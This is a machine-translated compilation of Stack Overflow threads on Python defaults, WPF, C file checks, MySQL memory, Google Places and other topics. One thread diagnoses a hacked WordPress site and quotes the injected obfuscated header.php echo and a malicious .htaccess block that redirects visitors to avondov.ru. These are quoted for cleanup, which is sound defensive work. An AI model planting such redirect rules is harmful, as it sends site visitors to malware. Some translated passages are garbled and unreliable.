Ch f flyspell-auto-correct-previous-word 告诉我数字参数称为“位置”。这看起来不像您正在寻找的东西。位置很可能是指缓冲区中的位置。查看 flyspell 源代码显示该参数*未以有意的方式使用*（无法判断覆盖是什么......）

```
;*---------------------------------------------------------------------*/
;*    flyspell-auto-correct-previous-word ...                          */
;*---------------------------------------------------------------------*/
(defun flyspell-auto-correct-previous-word (position) 
  "*Auto correct the first mispelled word that occurs before point."
  (interactive "d")

  (add-hook 'pre-command-hook 
        (function flyspell-auto-correct-previous-hook) t t)

  (save-excursion
    (unless flyspell-auto-correct-previous-pos
      ;; only reset if a new overlay exists
      (setq flyspell-auto-correct-previous-pos nil)

      (let ((overlay-list (overlays-in (point-min) position))
        (new-overlay 'dummy-value))
[SNIP] 
```

(interactive "d") 还表明，在交互式调用的情况下，点的当前位置被分配给位置。马蒂亚斯

# python - 为什么使用 `arg=None` 可以修复 Python 的可变默认参数问题？

> ID：10676729
> 
> 赞同：35
> 
> 时间：2012-05-20T19:59:31.620
> 
> 标签：python, function, arguments, mutable

我正在学习 Python，我正在处理[Mutable Default Argument 问题](https://stackoverflow.com/questions/1132941/least-astonishment-in-python-the-mutable-default-argument)。

```
# BAD: if `a_list` is not passed in, the default will wrongly retain its contents between successive function calls
def bad_append(new_item, a_list=[]):
    a_list.append(new_item)
    return a_list

# GOOD: if `a_list` is not passed in, the default will always correctly be []
def good_append(new_item, a_list=None):
    if a_list is None:
        a_list = []
    a_list.append(new_item)
    return a_list 
```

我知道只有在第一次遇到语句`a_list`时才会初始化，这就是为什么后续调用使用相同的列表对象。`def``bad_append`

我不明白的是为什么`good_append`工作方式有所不同。看起来`a_list`仍然*只会*初始化一次；因此，该`if`语句仅在第一次调用该函数时为真，这意味着`a_list`只会`[]`在第一次调用时重置，这意味着它仍然会累积所有过去的`new_item`值并且仍然是错误的。

为什么不是？我错过了什么概念？`a_list`每次运行时如何擦干净`good_append`？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-05-20T20:59:44.047

> 看起来 a_list 仍然只会被初始化一次

“初始化”不会发生在 Python 中的变量上，因为 Python 中的变量只是名称。“初始化”只发生在对象上，它是通过类的`__init__`方法完成的。

当你写的时候`a = 0`，那是一个任务。也就是说，“`a`应指由表达式`0`”描述的对象。这不是初始化；`a`可以在以后的任何时间命名任何类型的任何其他内容，这是由于将其他内容分配给`a`. 分配只是分配。第一个并不特别。

当您编写`def good_append(new_item, a_list=None)`时，这不是“初始化” `a_list`。它正在设置对对象的内部引用，即评估的结果`None`，以便在`good_append`没有第二个参数的情况下调用时，该对象会自动分配给`a_list`。

> 意味着 a_list 只会在第一次调用时重置为 []

不，`a_list`设置为任何`[]`开始的时间。也就是说，当要么显式传递，要么参数被省略时。`a_list``None``None`

出现问题`[]`是因为**表达式** 在此上下文中`[]`仅**评估一次。**当函数被编译，`[]`被评估时，一个**特定**的列表对象被创建——它恰好是空的——并且该对象被用作默认值。

> `a_list`每次运行时如何擦干净`good_append`？

它没有。它不需要。

您知道如何将问题描述为“可变默认参数”吗？

`None`是不可变的。

当您修改参数作为默认值的**对象时，会出现此问题。**

`a_list = []`不会修改`a_list`之前提到的任何对象。这不可以; 任意对象不能神奇地就地转换为空列表。`a_list = []`意思是“`a_list`应该停止引用它之前引用的内容，并开始引用`[]`”。先前引用的**对象**未更改。

当函数被编译并且其中一个参数具有默认值时，该值 - 一个**对象**- 被烘焙到函数中（它本身也是一个对象！）。当您编写使对象发生变异的代码时，对象也会发生变异。如果被引用的对象恰好是烘焙到函数中的对象，它仍然会发生变异。

但是你不能变异`None`。它是不可变的。

你可以变异`[]`。它是一个列表，并且列表是可变的。将项目附加到列表会改变列表。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2012-05-20T20:42:12.840

的默认值`a_list`（或任何其他默认值）一旦被初始化就会存储在函数的内部，因此可以以任何方式修改：

```
>>> def f(x=[]): return x
...
>>> f.func_defaults
([],)
>>> f.func_defaults[0] is f()
True 
```

分别 对于 Python 3：

```
>>> def f(x=[]): return x
...
>>> f.__defaults__
([],)
>>> f.__defaults__[0] is f()
True 
```

因此 in 的值`func_defaults`与内部函数中众所周知的相同（并在我的示例中返回以便从外部访问它。

换句话说，当调用`f()`是隐式时会发生什么`x = f.func_defaults[0]`。如果该对象随后被修改，您将保留该修改。

相反，函数**内部**的赋值总是得到一个新的`[]`. 任何修改都将持续到最后一次引用该修改为止`[]`；在下一个函数调用中，`[]`会创建一个新函数。

再说一遍，`[]`在每次执行时获取相同的对象是不正确的，但它（在默认参数的情况下）只执行一次然后保存。

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2012-05-20T20:03:19.213

仅当默认*值*是可变的时才存在问题，而事实`None`并非如此。与函数对象一起存储的是默认值。当函数被调用时，函数的上下文被初始化为默认值。

```
a_list = [] 
```

`a_list`只需在当前函数调用的上下文中为名称分配一个新对象。它不会`None`以任何方式修改。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-05-20T20:36:07.817

不， in`good_insert` `a_list`不会只初始化一次。

每次在不指定`a_list`参数的情况下调用函数时，使用默认值并使用并返回一个新的实例`list`，新列表不会替换默认值。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-05-11T20:29:40.737

python[教程](https://docs.python.org/3/tutorial/controlflow.html#default-argument-values)说

> 默认值只计算一次。

评估的（仅一次）默认值存储在内部（`x`为简单起见命名）。

**case `[]`:** 当你定义函数时`a_list`默认为`[]`，如果你不提供`a_list`，**它会被赋值为内部变量`x`**when 。因此，当您追加到 时`a_list`，您实际上是追加到`x`（因为`a_list`和`x`现在引用相同的变量）。当您在没有 的情况下再次调用该函数时`a_list`，更新`x`的内容将重新分配给`a_list`。

**case `None`：** 该值`None`被评估一次并存储在`x`. 如果您不提供 ，`a_list`则将变量 x 分配给 a_list。但你当然不会追加`x`。您将一个空数组重新分配给`a_list`. 此时`x`和`a_list`是不同的变量。同样，当您再次调用该函数而不使用 时`a_list`，它首先从中获取值`None`，`x`然后将 a_list 再次分配给一个空数组。

**请注意**，对于这种`a_list = []`情况，如果您在调用函数时提供显式值`a_list`，则新参数不会覆盖`x`，因为它只计算一次。

# wpf - 暂时禁用通过依赖属性启用的按钮

> ID：10676730
> 
> 赞同：0
> 
> 时间：2012-05-20T19:59:35.043
> 
> 标签：wpf, button, dependency-properties

我有以下内容：

```
 <Button Content="Do XXX" Height="23" Name="btnXXX"
                  IsEnabled="{Binding Path=(Model:INameOfInterface.CanDoXXX)}" />
    <Button Content="Do YYY" Height="23" Name="btnYYY"
                  IsEnabled="{Binding Path=(Model:INameOfInterface.CanDoYYY)}" /> 
```

工作得非常好，根据接口是否可以做 XXX 来启用或禁用 btnXXX，btnYYY 与 YYY 类似。

但是，为了每次单击强制执行一项操作，我想在单击其中一个按钮后禁用所有按钮，即暂时覆盖依赖项并禁用按钮，然后在执行操作后重新建立依赖项条件。

所以我的问题是：**我如何暂时禁用所有按钮，然后恢复依赖关系**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T07:28:19.613

您可以创建 bool 属性并将所有按钮 IsEnable 与它绑定。每当您执行某些操作时，将其设为假，并在完成操作后将其设为真，这反过来会影响所有按钮。或者您可以使用微调器/忙碌指示器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T12:54:51.537

通常，您不会“覆盖和恢复依赖属性”，而是设计模型/视图模型，以便绑定到的属性封装所有必需的状态。在您的情况下，这意味着您`Model:INameOfInterface.CanDoXXX`最初应该为真，并且在执行**任何**按钮操作时为假（xxx，yyy，...）。因此，您`CanDoXXX`必须了解`YYY`. 在你的模型中混合起来可能是个坏主意，这就是 ViewModel 发挥作用的地方。

假设您的 Model 实例仅具有自我意识：**仅**当正在执行时才`CanDoXXX`为假。您可以拥有一个包含模型集合的 ViewModel 类，每个模型都有其单独的状态。现在，您只需要在 VM 中放置一个属性，例如，它将遍历所有模型并检查它们中的任何一个是否正在工作（，表示）。最后绑定**`XXX``CanExecuteAny``CanDoXXX``CanDoYYY`**

 **```
<Button IsEnabled={Binding CanExecuteAny} /> 
```

这只是潜在的解决方案之一，最好的解决方案取决于数据的确切结构。以下是一些其他的想法：

*   您可以将所有按钮放在面板中并禁用面板而不是单个按钮。
*   实现`ICommand`接口并将按钮的`Command`属性绑定到它。见`RelayCommand`概念。我个人会去的。
*   由于您的按钮需要信息是否已单击任何其他按钮，您可能会发现让所有模型都可以访问某种全局状态很有用（完全依赖注入；没有 DI 的单例不太完美）。

话虽如此，基本思想是将所有需要的信息放在一个可以绑定的属性中。交换 DP 并不是一种真正的设计方式。已经存在更新内容，因此`Binding`多次设置它是重复相同的工作两次。**

# c - 我该如何检查文件是否存在

> ID：10676735
> 
> 赞同：0
> 
> 时间：2012-05-20T20:00:03.407
> 
> 标签：c, file-io

> **可能重复：**
> [C 检查文件是否存在](https://stackoverflow.com/questions/5745272/c-check-if-file-exists)

我只是想知道是否有人可以指出我应该如何检查文件是否存在的正确方向？在这一点上，我计划按照以下方式进行一些事情；

```
if(NULL==(fp=fopen(filepath, "r"))){ 
```

我的最终目标是找到在 bash 中替换它的解决方案（只是文件查找部分）

```
if ! (find /dev/shm/request-summon-*-$MCEXEC_PLAYERNAME.txt > /dev/null 2>&1); then 
```

非常感谢任何帮助，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:04:17.077

查看手册页以了解`stat()`也涵盖`lstat()`和`fstat()`。如果您得到 -1 作为返回值，则您尝试获取摘要信息的文件不存在，或者可能没有读取它的权限（请参见下面的最后一个示例，该示例显示了与您的`fopen()`测试的差异，因为文件可能存在但不存在让你打开它）。

```
edd@max:/tmp$ cat stat.c

#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc > 1)
        printf("Returned %d for %s\n", stat(argv[1]), argv[1]);
}
edd@max:/tmp$ gcc -o stat stat.c
edd@max:/tmp$ ./stat stat.c
Returned 0 for stat.c
edd@max:/tmp$ ./stat does-not-exist
Returned -1 for does-not-exist
edd@max:/tmp$ ./stat /root/.ssh/id_dsa    ## exists, but I can't read it
Returned -1 for /root/.ssh/id_dsa
edd@max:/tmp$ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:06:14.127

使用 stat() 或 lstat()。我个人更喜欢使用 lstat() 因为它告诉您目录条目是否是符号链接，而不是跟随链接。

为了您的最终目标，遍历目录树。您可以使用 opendir() 和 readdir() 来做到这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-20T20:06:26.270

在 POSIX 系统上，您可以尝试打开文件并检查它是否`errno == ENOENT`失败（返回`NULL`）：

```
if ((fp = fopen(path, "r")) == NULL)
    if (errno == ENOENT)
        // file doesn't exist 
```

没有纯粹的 ISO C 方法可以做到这一点。

使用`stat`or`lstat`也是可能的，但当文件在文件打开和文件打开之间创建时，可能会导致[竞争条件](https://en.wikipedia.org/wiki/Race_condition)`stat`。

# django - 如何跨波动的 django 服务器的 aws ec2 实例管理 memcached 集群

> ID：10676737
> 
> 赞同：3
> 
> 时间：2012-05-20T20:00:10.387
> 
> 标签：django, amazon-ec2, amazon-web-services, memcached

在 Django 中，为了集群 memcached 节点，使用了一种非常简单的方法。只需在所有 django 服务器的 settings.py 文件中列出所有节点地址，如下所示：

```
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.memcached.MemcachedCache',
        'LOCATION': [
            'xxx.xxx.xxx.240:11211',
            'xxx.xxx.xxx.242:11211',
            ...,
        ]
    }
} 
```

显然，每当实例退出或添加新实例时编辑每个实例的 setting.py 文件会很痛苦，您将如何自动管理向集群添加新节点？

*   所有实例都位于负载均衡器后面。

可能的非答案：

*   我也可以只使用一个 django 实例来运行一个 memcached 单节点，因为我只使用 memcached 来存储微小的令牌。 **但目标是让所有 ec2 实例都相同。**
*   我也可以使用 elasticache，但对于最小的版本来说它很贵（35 美元/月！:)）

注意：我使用 memcached 来防止 celeryd 工作人员访问相同的资源，但如果资源偶尔被双重访问也可以。而且我的代币寿命很短（不到 15 秒）。因此，丢失 memcached 节点并不是什么大问题，只要它不会发生得太频繁。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:26:27.453

如果您的缓存数据确实非常小，那么您可能会对像 redistogo.com 这样的非亚马逊托管缓存服务感兴趣。如果您的数据足够小并且定价非常合理，他们会提供免费版本。

这根本不能回答您的问题，但是由于您提到了弹性疼痛但对价格犹豫不决，也许它会满足您的需求。

# php - 加载站点时下载count29.php

> ID：10676741
> 
> 赞同：0
> 
> 时间：2012-05-20T20:00:34.420
> 
> 标签：php, wordpress

当我的站点正在加载`count29.php`要从站点下载的文件时`avondov.ru`。这使网站无法完全加载，有时会重定向到未找到的 404 页面

我怎么能忽略这个错误？

我的网站是：[http ://adinehbajestan.ir](http://adinehbajestan.ir)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:14:58.657

您的网站感染了恶意软件， [http://sitecheck.sucuri.net/results/adinehbajestan.ir](http://sitecheck.sucuri.net/results/adinehbajestan.ir)

更新您的站点脚本和/或从备份恢复

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:25:46.580

我想我发现了我的问题。这是一个真正的恶意软件。此代码已添加到 header.php 中：

```
#d93065#
echo(gzinflate(base64_decode("3VXBbptAEP2V......1G5y+828z/8A")));
#/d93065# 
```

从 header.php 中删除此代码时是正确的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T19:32:22.357

是的，主要是像 index.php 或 header.php 这样的基本页面被修改

```
#d93065# echo(gzinflate(base64_decode("3VXBbptAEP2V......1G5y+828z/8A"))); #/d93065# 
```

另外，不要忘记清理所有 .htaccess 文件，它们会被这种不需要的重定向修改

```
#d93065#
RewriteEngine On
ErrorDocument 400 avondov.ru/count29.php 
ErrorDocument 401 avondov.ru/count29.php
ErrorDocument 403 avondov.ru/count29.php
ErrorDocument 404 avondov.ru/count29.php
ErrorDocument 500 avondov.ru/count29.php
ErrorDocument 502 avondov.ru/count29.php
RewriteCond %{HTTP_REFERER} .*google.* [OR]
RewriteCond %{HTTP_REFERER} .*ask.* [OR]
# long list of referrers
RewriteCond %{HTTP_REFERER} .*flickr.*
RewriteRule ^(.*)$ avondov.ru/count29.php [R=301,L]
#/d93065# 
```

这是一个临时的解决方法，但入侵者可以再次修改，这可能是由弱密码、错误的第三方插件或您正在使用的 CMS 中的错误引起的，因为它已经渗透到 joomla 和 wordpress 站点。

-CK

# javascript - 将此设置为 var 会导致可能的严格违规：

> ID：10676750
> 
> 赞同：0
> 
> 时间：2012-05-20T20:01:13.593
> 
> 标签：javascript, jshint

> **可能重复：**
> [为什么 JSHINT 抱怨这是一个严格的违规行为？](https://stackoverflow.com/questions/7688765/why-is-jshint-complaining-that-this-is-a-strict-violation)

在下面的缩写代码中，我使用此函数来确定函数参数是元素 id 还是对象。这样我总是有可以使用的元素。

```
function domPageFlip( some_var )
{
    var select_element;

    if( typeof ( some_var ) === 'string' ) // internally called
    {
        select_element = document.getElementById( some_var );
    }
    else // called by user event ( via event listener )
    {
        select_element = this;
    } 
```

jshint 给出了可能的严格违规。如何编写代码，以免出现这种违规行为？

# mysql - 减少 ubuntu@aws 微实例上 mysql 的内存消耗

> ID：10676753
> 
> 赞同：39
> 
> 时间：2012-05-20T20:01:43.967
> 
> 标签：mysql, memory-management, amazon-ec2, amazon-web-services, mysql-management

我最近开始了一个 PoC 项目，我们正在开发一个小型 Web 应用程序。初始设置是在 AWS 的微型实例上完成的。我们在 rails+mysql 堆栈上。

安装/运行 MySQL 后，我看到已经消耗了大约 500+ MB RAM；剩下的系统要少得多（微型实例只有 620 MB RAM）。

在这个阶段，我们的应用程序相当简单。我可以做些什么来减少 MySQL 服务器消耗的内存吗？

感谢帮助。

* * *

## 回答 #1

> 赞同：106
> 
> 时间：2013-10-01T12:25:11.817

在您的`/etc/my.cnf`文件中：

```
performance_schema = 0 
```

并重新启动 MySQL。如果您以前启用它，这应该会大大减少内存使用量。

* * *

**编辑：**对于 5.7.8 和 8.0.1 之间的 MySQL 版本（[从 8.0.1 开始不需要](https://dev.mysql.com/doc/refman/8.0/en/added-deprecated-removed.html)），以上内容不足以释放性能模式数据的内存：

> 从 MySQL 5.7.8 开始，即使禁用 Performance Schema，它也会继续填充 global_variables、session_variables、global_status 和 session_status 表。

（[来源](http://dev.mysql.com/doc/refman/5.7/en/performance-schema-system-variables.html)）

为了防止这种行为，`show_compatibility_56`除了 . 之外，还设置为 1 `performance_schema`。也就是说，您的 my.cnf 更改应如下所示：

```
performance_schema = 0
show_compatibility_56 = 1 
```

* * *

## 回答 #2

> 赞同：42
> 
> 时间：2012-05-20T20:31:15.403

在 MySQL 配置文件 (my.cnf) 中更改此设置

```
key_buffer              = 8M 
max_connections         = 30 # Limit connections
query_cache_size        = 8M # try 4m if not enough 
query_cache_limit       = 512K
thread_stack            = 128K 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-20T20:39:49.267

只是添加到另一个答案。我最近在使用 Amazon 微型实例（不是 Ubuntu）时遇到了这个问题。my.cnf 文件几乎是空的，所以我所做的是：

```
cp /etc/my.cnf /etc/my.cnf.orig
cp /usr/share/mysql/my-medium.cnf /etc/my.cnf 
```

编辑 my.cnf 并启用 innodb 行（如果适用）。重启mysqld。

微型实例也没有交换，这可能是个问题..

```
SWAPFILE=/mnt/swapfile.swap
dd if=/dev/zero of=$SWAPFILE bs=1M count=512
mkswap $SWAPFILE
swapon $SWAPFILE 
```

然后在 /etc/rc.local 添加：

交换 /mnt/swapfile.swap

要在 ruby​​ 中节省内存，您可能需要使用 ruby​​ enterprise：

```
bash < <(curl -s https://raw.github.com/wayneeseguin/rvm/master/binscripts/rvm-installer)
gpasswd -a root rvm
source /etc/profile.d/rvm.sh
rvm get head
rvm reload
rvm install ree
rvm --default use ree 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-12-28T19:03:14.820

我有一台只有 500mb 内存的服务器，发现随着我的表变大，mysql 开始使用大量内存。在玩了一堆设置之后，对我来说减少内存使用的是将我所有的表都转换为 MyISAM。如果您不需要 innodb 将表转换为 MyISAM 的功能，会很有帮助。您可以像这样转换表格：

```
ALTER TABLE test.mytable ENGINE=MyISAM; 
```

进行此更改后，我发现内存使用量减少了 20%。为了进一步减少内存使用，您可以将所有表转换为 MyISAM，然后完全关闭 mysql 中的 innodb 支持。这将我的内存使用量减少了 50%。

您可以通过添加：

```
[mysqld]
default_storage_engine=myisam
innodb=OFF 
```

然后重启mysql。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2022-03-04T08:44:47.427

**配置交换文件**  sudo fallocate -l 2G /swapfile sudo chmod 600 /swapfile sudo mkswap /swapfile sudo swapon /swapfile sudo cp /etc/fstab /etc/fstab.bak sudo nano /etc/fstab

在末尾添加以下行，保存并关闭： /swapfile swap swap defaults 0 0

sudo sysctl vm.swappiness=10 sudo vi /etc/sysctl.conf

在末尾添加以下行，保存并关闭：vm.swappiness=10

**配置 PHP**   sudo nano /opt/bitnami/php/etc/memory.conf

```
; Bitnami memory configuration for PHP-FPM
;
; Note: This will be modified on server size changes
pm.max_children=10
pm.start_servers=2
pm.min_spare_servers=2
pm.max_spare_servers=10
pm.max_requests=5000 
```

**配置 MariaDB (MySQL)**   sudo nano /opt/bitnami/mariadb/conf/bitnami/memory.conf

```
[mysqld]
#wait_timeout = 120
long_query_time = 1
query_cache_limit=2M
query_cache_type=1
query_cache_size=8M
innodb_buffer_pool_size=16M
#innodb_log_file_size=128M
#innodb_flush_method=O_DIRECT
tmp_table_size=16M
max_connections = 100
max_user_connections = 250
key_buffer_size=8M 
```

sudo /opt/bitnami/ctlscript.sh 重启

# android - Android Opencv cvt 颜色

> ID：10676769
> 
> 赞同：-1
> 
> 时间：2012-05-20T20:04:42.070
> 
> 标签：android, opencv, bitmap

我正在尝试使用opencv捕获图像，然后得到一个垫子，然后创建一个位图，然后尝试使用getpixel猜测位图中像素的de值，但结果始终为零。这里我写代码：

```
capture.retrieve(mRgba, Highgui.CV_CAP_ANDROID_COLOR_FRAME_RGBA);
capture.retrieve(mGray, Highgui.CV_CAP_ANDROID_GREY_FRAME);

mRgba2 = new Mat();
Imgproc.cvtColor(mGray, mRgba2, Imgproc.COLOR_GRAY2RGBA,4);
Bitmap bmp2 = Bitmap.createBitmap(mRgba2.cols(), 
mRgba2.rows(),Bitmap.Config.ARGB_8888);
int color = 0;
int green = 0;
int blue = 0;
int color = 0;
color = bmp2.getPixel(200, 200);
red = Color.red(color);
green = Color.green(color);
blue = Color.blue(color); 
```

对于每个红色、绿色、蓝色值，颜色的值始终为零。05-20 21:47:25.761: I/Sample::FdView(9060): 800 05-20 21:47:25.761: I/Sample::FdView(9060): yImage= 05-20 21:47:25.761: I/Sample::FdView(9060): 480 05-20 21:47:25.761: I/Sample::FdView(9060): 0 05-20 21:47:25.761: I/Sample::FdView(9060):红色= 05-20 21:47:25.761: I/Sample::FdView(9060): 0

如果有人可以帮助我，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T15:17:14.720

我需要使用指令

```
Utils.matToBitmap(result, bmp); 
```

通过这种方式，我填充了 bmp 变量。

# ios - 进入和退出编辑模式时防止自定义单元格中的元素动画

> ID：10676770
> 
> 赞同：0
> 
> 时间：2012-05-20T20:04:52.383
> 
> 标签：ios, uitableview

我有一个自定义单元格，其中有一个 UIImageView，我不想在进入和退出编辑模式时设置动画。我已经让它使用 autoresizingMask 属性为另一个方向设置动画，但我无法阻止它的移动。

我用一个类创建自定义单元格，然后在 cellForRowInIndexPath 方法中使用它。UIImageView 是该类的一部分，尽管布局是在 cellForRowInIndexPath 中完成的。我本质上是在创建一个横跨底部的进度条。所以它将从左到右跨越。我试图阻止的动画是在进入编辑模式时，图像视图向右滑动以为删除圆形图形腾出空间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-19T17:08:33.693

只需在 tableview 委托中实现此代码：

```
-(BOOL)tableView:(UITableView *)tableView shouldIndentWhileEditingRowAtIndexPath:(NSIndexPath *)indexPath
{
    return NO;
} 
```

如果您不想在进入编辑模式时在 tableview 单元格上移动任何东西，这将起作用。现在，如果您想移动*一些*东西，请使用 jrturton 答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:30:46.097

图像视图可能被添加为单元格内容视图的子视图。当单元格进入编辑模式时，内容视图会调整大小，这意味着如果图像视图靠近内容视图的边缘，则必须移动它。

要将其保持在同一位置，可以直接将其添加为单元格的子视图，而不是单元格的内容视图。

# objective-c - 全局套接字启动 (AsyncSocket)

> ID：10676780
> 
> 赞同：1
> 
> 时间：2012-05-20T20:06:13.673
> 
> 标签：objective-c, cocoa, asyncsocket

我正在尝试从另一个类（不在“applicationDidFinishLaunching”中）启动一个套接字，因此，在**AppDelegate.m**中，我调用了 netClass 类：

```
- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    netClass *network = [[netClass alloc] init];
    [network startNet];
} 
```

而在**netClass**中，方法 startNet 正常启动套接字：

```
- (void)startNet 
{
    [DDLog addLogger:[DDTTYLogger sharedInstance]];
    ...
    [netService publish];
} 
```

但是netClass中的asyncSocket方法，如“didAcceptNewSocket”、“socketDidDisconnect”、“netServiceDidPublish”，没有被调用。

知道怎么称呼它吗？

任何帮助将不胜感激 ：-）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T15:48:59.823

您需要通过向任何您的 NSNetService 对象发送消息来设置委托`setDelegate:`- 从您发布的代码中看起来就是“ `netService`”（`[netService setDelegate:self];`）。

将“ `NSApplicationDelegate, NSNetServiceDelegate, GCDAsyncSocketDelegate`”放在您的 .h 文件中不会设置委托，它基本上只是让编译器知道您打算实现这些协议的方法。此外，您不应该在`NSApplicationDelegate`那里，因为您已经有一个应用程序委托。

# google-places-api - 获取与 Google Places/Geocoding API 的交集

> ID：10676790
> 
> 赞同：12
> 
> 时间：2012-05-20T20:07:06.967
> 
> 标签：google-places-api, google-geocoding-api

我正在尝试使用 Google Places API 找到距离某个点最近的两条街道（基本上是为了指示最近的十字路口）。但是，任何结果都只会返回一个“路线”，如果有的话。

我想我可以在 + 或 X 模式下进行 5 次查询，但这很笨拙，不可靠，当然会很快达到查询限制。

我很想说这是一个深思熟虑的举动，因为 API 不打算用于导航系统之类的东西（我不想这样做），但我仍然希望有一种符合 TOS 的方式来获得交叉点.

旁注 - 似乎指定“types=route”从不返回任何结果，这进一步让我怀疑 Places 仅用于实际 POI，而不是用于导航，尽管[服务条款](https://developers.google.com/maps/terms)没有提及任何明确的这方面的限制。

编辑：正如克里斯指出的那样，有专门为地理编码设计的地理编码 API，但除了通过多个查询之外，我仍然看不到获得最近十字路口的方法。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-06-06T17:37:10.320

GeoNames 为从纬度/经度坐标最近的交点提供了地理编码 API。

[http://www.geonames.org/maps/us-reverse-geocoder.html#findNearestIntersection](http://www.geonames.org/maps/us-reverse-geocoder.html#findNearestIntersection)

JSON 响应如下所示：

```
{"intersection":
 {"adminName2":"San Mateo",
  "street2":"Curtis St",
  "postalcode":"94025",
  "street1":"Roble Ave",
  "adminCode1":"CA",
  "distance":"0.08",
  "countryCode":"US",
  "lng":"-122.180842",
  "placename":"Menlo Park",
  "lat":"37.450649",
  "adminName1":"California"
 },
 "credits":"1.0"
} 
```

`street1`并且`street2`是十字路口。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-01T15:29:08.413

共识是谷歌的反向地理编码器不够复杂，无法在一次查询中报告交叉点。也就是说，没有一个参数可以用来告诉他们你只想要结果`"types" : [ "intersection" ]`。谷歌在这里吃自己的狗粮；如果您在 maps.google 搜索框中输入纬度/经度，您总会得到一条街道（用 Google 的说法，“路线”）。

正如您所指出的，您可以应用很多启发式方法来获得令人垂涎的`["intersection"]`类型。

例如，第一世界城市中的几个“主要”十字路口都有描述十字路口的中转站。如果任何结果有一个 `"types" : [ "bus_station", "transit_station" ]`元素，您可以尝试将该`"long_name"`元素作为搜索词，并希望您得到一个交集。smirkingman 还提到了一个可行的解决方案。唉，这两个都需要 2+ 查询。

总之，Google Geocoding API 中没有 latelngToIntersection(lat,lng) 类型的函数。这方面的证据存在于 Google 自己的 maps.google 页面中。我会以不同的方式解决您的问题。如果您想在给定 GPS 位置的情况下获得最近的主要十字路口，那么让用户提供帮助可能会有所帮助。众所周知，地理编码充满了恶心的人性。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-30T01:42:18.320

您可以使用来自[OpenStreetMap](http://www.openstreetmap.org/)的数据。他们的`.osm`文件提供了交叉街道的纬度/经度。

1.  如何获取数据。

    1.  转到[OpenStreetMap](http://www.openstreetmap.org/)并找到您感兴趣的地方，像第 4 个刻度线一样放大。

    2.  单击顶部导航栏上的导出，在下拉菜单中，按“OpenStreetMap XML 数据”并单击“导出”。

    3.  对于像州或国家这样的大量数据，`Planet.osm`并找到您想要的“提取物”。

2.  要获取交叉路口，您需要查找与此格式匹配的数据，可能要搜索高速公路。

例子：

```
<way id="6419265" user="eric22" uid="160949" visible="true" version="2" changeset="10632563" timestamp="2012-02-09T10:49:21Z">
  <nd ref="53167978"/>
  <nd ref="53163978"/>
  <nd ref="53163979"/>
  <nd ref="53173508"/>
  <nd ref="53164158"/>
  <nd ref="53173510"/>
  <tag <b>k="highway"</b> v="residential"/>
  <tag k="name" v="Alberta St"/>
  <tag k="tiger:cfcc" v="A41"/>
  <tag k="tiger:county" v="St. Louis-City, MO"/>
  ...
</way> 
```

way.id 是街道 id，nd refs 是街道 id，您应该可以在同一个文件中找到。它们看起来像这样

```
‹node id="53167978" lat="38.5852785" lon="-90.2450074" user="eric22" uid="160949" visible="true" version="3" changeset="10632563" timestamp="2012-02-09T10:48:49Z"/> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-21T01:28:57.837

您是对的，Places API 不适合用于地理编码。街道和城镇等政治结果仅限于 2 个结果，因为它们仅用于为返回的地点提供区域标识。

如果您想搜索街道等，请尝试使用地理编码 API：[https ://developers.google.com/maps/documentation/geocoding/](https://developers.google.com/maps/documentation/geocoding/)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-05-31T08:36:08.533

如前所述，没有 GoogleMap 工具可以反向地理编码并获得一组接近点。

我看到的唯一选择是

*   用 Haversine 计算该点的 200 米 N/S/E/W。您需要根据经验选择“200”
*   对这 4 个点进行反向地理编码
*   从返回的地址中，走 2 个最近的不同街道（可能不会成功）

如果您在客户端执行此操作，您的用户很少会遇到每日 2'500 的限制。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-30T04:15:17.420

Google Maps API 不支持此功能。它只是一个地址地理编码器。您可以使用 Google Maps API 做的最好的事情是使用他们的路线服务来查找第一个转弯的位置，但这完全是 hack。您可能想尝试研究可以提供此功能的其他地图服务。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2020-08-26T15:19:46.317

这是一个老问题，但我正在寻找相同的功能，谷歌把我带到了这里。

显然现在可以通过简单地在两个街道名称之间放置一个＆符号来搜索十字路口，比如

```
street name 1 & street name 2 
```

这种技术适用于地理编码 API 和谷歌地图网站。

# html - Css中心对齐菜单？

> ID：10676791
> 
> 赞同：1
> 
> 时间：2012-05-20T20:07:17.217
> 
> 标签：html, css

我的页面中有一个菜单。这是代码：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Untitled Document</title>
